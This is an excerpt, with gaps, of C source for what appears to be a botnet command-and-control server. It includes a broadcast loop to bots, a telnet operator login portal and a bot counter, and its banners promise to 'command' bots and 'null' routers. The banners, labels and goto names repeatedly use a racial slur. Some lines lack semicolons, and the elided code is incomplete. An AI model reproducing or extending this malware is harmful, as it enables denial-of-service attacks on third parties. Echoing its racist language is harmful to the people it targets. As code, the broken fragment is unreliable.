...
#define BOTNET_SERVER_PORT 53
#define BOTS
#define MAXFDS 1000000 // Will Never Need This Much
...
void broadcast(char *msg, int us)
{
		...
		for(i = 0; i < MAXFDS; i++)
		{
				...
				send(i, "\r\n", 2, MSG_NOSIGNAL);
				if(sendMGM && management[i].connected) send(i, "\r\n\x1b[36m> \x1b[37m", 15, MSG_NOSIGNAL);
				else send(i, "\n", 1, MSG_NOSIGNAL);
		}
		free(wot);
}
...
void *titleWriter(void *sock)
{
		...
		while(1)
		{
				...
				sprintf(string, "%c]0;Bots: %d | Niggers: %d%c", '\033', clientsConnected(), managesConnected, '\007');
...
void *telnetWorker(void *sock, void *telnetListener)
{
		...
		if(send(thefd, "\x1b[31m* \x1b[32mUsername:\x1b[30m             *\r\n", 22, MSG_NOSIGNAL) == -1) goto end;
		if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
		trim(buf);
		nickstring = ("%s", buf);
		find_line = Search_in_File(nickstring);
		if(strcmp(nickstring, accounts[find_line].id) == 0){
		if(send(thefd, "\x1b[31m* \x1b[32mPassword:\x1b[30m				*\r\n", 22, MSG_NOSIGNAL) == -1) goto end;
		if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
		trim(buf);
		if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
		memset(buf, 0, 2048);
		goto EnteringNiggerNet
		}
		failed:
		if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, "\x1b[31m*****************************************\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, "\x1b[31m*        		DEPORTED!!        		*\r\n", 48, MSG_NOSIGNAL) == -1) goto end
		if(send(thefd, "\x1b[31m*****************************************\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
		goto end;
		EnteringNiggerNet:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[31m*****************************************\r\n", 54, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[31m*    \x1b[36mStarting Up NiggerNeT...   *\r\n\r\n", 55, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[31m*****************************************\r\n", 59, MSG_NOSIGNAL) == -1) goto end;
		sleep(5);
		goto Portal;
		Portal:
		if(send(thefd, "\x1b[31m*			Welcome To The NiggerNeT	*\r\n", 59, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, "\x1b[31m*			 Command Those Botz!!		*\r\n", 59, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, "\x1b[31m*			Null Them Niggaz Routerz    *\r\n", 59, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, "\x1b[31m*****************************************\r\n", 59, MSG_NOSIGNAL) == -1) goto end;
		...
		if(send(thefd, "\r\n[~Enter Command~]# ", 17, MSG_NOSIGNAL) == -1) return;
		...
		if(strstr(buf, "!* BOTS"))
		{
			sprintf(botnet, "Bots: %d | Niggers: %d\r\n", clientsConnected(), managesConnected);
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		}
		trim(buf);
				if(send(thefd, "\r\n[~Enter Command~]# ", 15, MSG_NOSIGNAL) == -1) return;
...
void *telnetListener(void *useless)
{
		...
		serv_addr.sin_port = htons(BOTNET_SERVER_PORT);
